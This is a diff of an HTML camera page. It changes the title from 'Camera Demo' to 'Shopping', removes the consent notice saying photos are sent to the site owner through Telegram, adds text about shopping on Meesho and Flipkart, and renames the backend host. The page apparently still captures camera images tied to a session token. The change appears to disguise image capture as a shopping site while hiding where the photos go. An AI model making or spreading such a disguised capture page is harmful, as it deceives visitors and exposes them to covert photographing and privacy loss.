@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera Demo</title>
+<title>Shopping</title>
 
 <style>
   body {
@@ -73,12 +73,9 @@
 <body>
 <div class="container">
 
-  <h2>Camera Demo</h2>
+  <h2>Shopping</h2>
 
-  <p>
-    Camera permission is requested only after you tap Start Camera.
-    You can preview the photo before choosing to send it to the
-    site owner through Telegram.
+  <p>Shopping On the Meesho And Flipkart
   </p>
 
   <video id="video" autoplay playsinline muted></video>
@@ -112,7 +109,7 @@
 
 <script>
 const BACKEND_URL =
-  "https://camera-share-backend.onrender.com";
+  "https://shopping.onrender.com";
 
 const params = new URLSearchParams(location.search);
 const token = params.get("session") || params.get("token");
